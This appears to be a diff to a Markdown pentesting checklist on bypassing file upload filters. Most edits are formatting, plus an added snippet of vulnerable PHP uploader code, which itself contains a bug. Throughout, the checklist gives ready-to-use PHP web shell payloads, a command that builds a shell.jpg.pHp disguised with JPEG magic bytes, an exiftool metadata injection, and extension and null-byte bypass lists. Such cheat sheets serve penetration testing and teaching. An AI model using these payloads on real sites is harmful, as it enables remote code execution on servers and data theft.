@@ -11,7 +11,8 @@
         - `HTML`, `JS` : HTML injection, XSS, Open redirect
         - `PNG`, `JPEG`: Pixel flood attack (DoS)
         - `ZIP`: RCE via LFI, DoS
-        - `PDF`, `PPTX`: SSRF, BLIND XXE
+        - `PDF`, `PPTX`: SSRF, BLIND XXE   
+        - - - -
     - Bypass
         - [ ] Blacklisting Bypass
             - PHP → `.phtm`, `phtml`, `.phps`, `.pht`, `.php2`, `.php3`, `.php4`, `.php5`, `.shtml`, `.phar`, `.pgif`, `.inc`
@@ -52,15 +53,16 @@
             ```php
             GIF89a; <?php system($_GET['cmd']); ?>
             ```
- 
+          </br> 
         - [ ] Magic Number Bypass
-            - Magic numbers are the first bits of a file which uniquely identify the type of file. it can be helpful to look for file format signatures and inferring how the application is using them based on these signatures, as well as how these formats may be abused to provoke undefined behavior within the application.
-            - These bytes can be used by the system to “differentiate between and recognize different files” without a file extension.
-            - Magic numbers (File signatures) are typically not visible to the user, but, can be seen by using a hex editor or by using the ‘xxd’ command to read the file
+            > Magic numbers are the first bits of a file which uniquely identify the type of file.</br>
+            > it can be helpful to look for file format signatures and inferring how the application is using them based on these signatures, as well as how these formats may be abused to provoke undefined behavior within the application.</br>
+             These bytes can be used by the system to “differentiate between and recognize different files” without a file extension.</br>
+             Magic numbers (File signatures) are typically not visible to the user, but, can be seen by using a hex editor or by using the ‘xxd’ command to read the file.
             ```bash
             └─$ xxd image.jpeg | head
             ```
-            - Download hex editor: To corrupt a file, we require a hex editor. hexedit is a popular tool used for the same. You can install it using:
+            > Download hex editor: To corrupt a file, we require a hex editor. hexedit is a popular tool used for the same. You can install it using:
             ```bash
             └─$ sudo apt-get install hexedit
             ```
@@ -68,21 +70,21 @@
             ```bash
             └─$ hexeditor image.png
             ```
-            - To change a byte using hexedit, you simply have to move the cursor over a byte, and type what you would like to.
-            - To save and exit, press ctrl X and then Y.
-            - To make php file with jpg magic number use this code:
+            > To change a byte using hexedit, you simply have to move the cursor over a byte, and type what you would like to.</br>
+            > To save and exit, press ctrl X and then Y.</br>
+            > To make php file with jpg magic number use this code:
             ```bash
             └─$ echo -n -e '\xFF\xD8\xFF\xE0\n<?php system($_GET['cmd']); ?>'  > shell.jpg.pHp 
             or
             └─$ echo -e $'\xFF\xD8\xFF\xE0\n<?php system($_GET['cmd']); ?>'  > shell.jpg.pHp
             ```
-            - You can also check it with this command:
+            > You can also check it with this command:
             ```bash
             └─$ file shell.jpg.pHp
             shell2.png.pHp: JPEG image data
             ```
-            
-      </br>   
+        - - - -
+      
     - Vulnerabilities
         - [ ]  Directory Traversal
             - Set filename `../../etc/passwd/logo.png`
@@ -168,7 +170,7 @@
             </svg>
             </code>
             ```
-
+        - - - -
     - Misc
         - [ ]  Uploading `file.js` & `file.config` (web.config)
         - [ ]  Pixel flood attack using image
@@ -181,7 +183,7 @@
             ```php
             exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
             ```
-            
+        - - - -            
     - My Full Scanario For Bypass:
 
         -   Just uploading .php file instead of jpg file.
@@ -190,7 +192,33 @@
         -   Tried Case sensitives — pic.PhP also tried pic.php5, pHP5.
         -   Tried special characters to bypass pic.php%00 , pic.php%0a, pic.php%00
         -   Basically every file extension has its own magic number, and I took a php-reverse-shell.php file and using hex editor I added the magic number of jpeg i.e., FF D8 FF E0 at start of the php file using the hex tool.
-
+        - - - -
+    - Vulnerable uploader code for mgic bytes:
+        - [ ]  PHP code:
+            ```php
+            <?php
+            $allowed_image_types = false;
+            $image_content = file_get_contents( 'image.png' );
+            $allowed_image_types = array(
+	            'jpeg' => "\xFF\xD8\xFF",
+	            'gif' => "GIF",
+            	'png' => "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a",
+	            'bmp' => "BM",
+            	'psd' => "8BPS",
+            	'swf' => "FWS",
+            );
+            foreach ( $allowed_image_types as $allowed_image_type => $allowed_binary_check ) {
+	        if ( substr( image_content, 0, strlen( $allowed_binary_check ) ) === $allowed_binary_check ) {
+		    echo 'This ' . $allowed_image_type . ' image is allowed!';
+	        } else {
+	           	echo 'Nope!';
+                }
+            }
+            ?>
+            ```
+        - - - -
+    
+        
 ### References:
 * https://github.com/HolyBugx/HolyTips/blob/main/Checklist/File%20Upload.md
 * https://book.hacktricks.xyz/pentesting-web/file-upload
